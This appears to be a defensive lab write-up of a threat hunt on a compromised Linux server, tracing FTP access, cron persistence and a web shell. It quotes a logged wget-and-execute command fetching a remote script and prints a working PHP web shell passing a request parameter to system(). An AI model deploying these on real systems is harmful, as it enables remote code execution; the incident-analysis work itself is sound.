# Lab: Linux System Hunt

## Scenario 

A potential compromise on a Linux developer server after suspicious Slack activity and unusual network connections were reported.The objective was to investigate potential host-based indicators and confirm whether the two incidents were related.

## Summary
The threat actor gained initial access to the server via FTP and established persistence using a cron job that periodically downloaded and executed a malicious shell script. Further analysis revealed the use of a PHP web shell for remote command execution.

## Commands Run
- journalctl | grep -i "ftp" | grep -i "success"  to check for successful FTP authentications
- journalctl | grep -i /tmp to check for changes to the /tmp directory
- find / -newermt "3 Sept 2021 06:00:03" ! -newermt "3 Sept 2021 06:01:47" 2>/dev/null to find modified files between within the timefram
- journalctl | grep ftpadam | grep "110\.44\.125\.139" to search for all activities belonging to ftpadam (account logged into by the threat actor) and determine their activity

## Findings (timeline)

### Initial Access
- Timestamp: Sept 3, 2021 – 05:52:31
- Method: FTP login using account ftpadam
- Source IP: 110.44.125.139
- Evidence of successful FTP authentication confirming external access to the system.
![FTP](image.png)

### Persistence
- Timestamp: Sept 5, 2021 – 00:00:01
- Mechanism: A shell script was dropped in /tmp via wget, made executable, and executed by root.
- Command observed in logs: `wget http://crest.tt/bJx3 -O /tmp/tmp.sh && chmod +x /tmp/tmp.sh && bash /tmp/tmp.sh`


- A weekly cron job was also created to automatically download and execute the same remote script as root, ensuring continuous persistence.
![Shell Script](image-1.png)
![Cron Job](image-2.png)

### Remote code execution via web shell
A PHP file was. The snippet in the screenshot below checks whether an HTTP parameter named z was provided (\$_REQUEST["z"]). If so, it prints a "pre" tag, assigns the parameter to \$z, and calls system(\$z). system() executes the string as a shell command on the server and returns output. *die* ends script execution after running the command. An attacker can send `http://victim/shell.php?z=whoami` (or other commands) and have the server run arbitrary shell commands as the web server user

Snippet observed:
`<?php 
if(isset($_REQUEST["z"])) {
  echo "<pre>"; 
  $z = ($_REQUEST["z"]); 
  system($z); 
  echo "</pre>"; 
  die; 
}
?>`

### Last Activity
The attacker’s last observed activity occurred at Sept 3, 2021 – 09:25:25.
![Last Activity](last_activity.png) 


## Mitigation Recommendations
- Rotate all service passwords and kill sessions for user account `ftpadam`
- Block ip `110.44.125.139` at the firewall level
- Remove the cron jobs created by the actor
- Remove malicious PHP web shell


## MITRE ATT&CK Mapping
- T1133 (initial access via remote services)
- T1053.003 (Persistence via Scheduled Task/Job)

